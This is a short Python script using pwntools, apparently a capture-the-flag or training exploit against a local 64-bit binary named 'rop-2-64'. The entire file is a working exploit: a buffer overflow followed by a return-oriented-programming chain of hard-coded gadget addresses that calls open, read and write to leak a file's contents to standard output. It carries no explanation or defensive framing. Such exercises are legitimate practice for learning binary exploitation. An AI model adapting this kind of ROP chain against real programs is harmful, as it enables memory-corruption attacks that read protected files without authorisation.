#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-64")

buf = "A" * 0x80 + "A"*8


read = p64(0x00000000004004f0)
openn = p64(0x0000000000400510)
writee = p64(0x00000000004004d0)

pop_rdi_ret = p64(0x0000000000400743)
pop_rsi_r15_ret = p64(0x0000000000400741)
pop_rdx_ret = p64(0x0000000000400668)

string = p64(0x4002d0)

buf += pop_rdi_ret
buf += string
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0) #XXXX
buf += pop_rdx_ret
buf += p64(0)
buf += openn


buf += pop_rdi_ret
buf += p64(0x00000003)
buf += pop_rsi_r15_ret
buf += p64(0x601800)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(0x00000100)
buf += read


buf += pop_rdi_ret
buf += p64(0x00000001)
buf += pop_rsi_r15_ret
buf += p64(0x601800)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(0x00000100)
buf += writee

p.sendline(buf)
p.interactive()

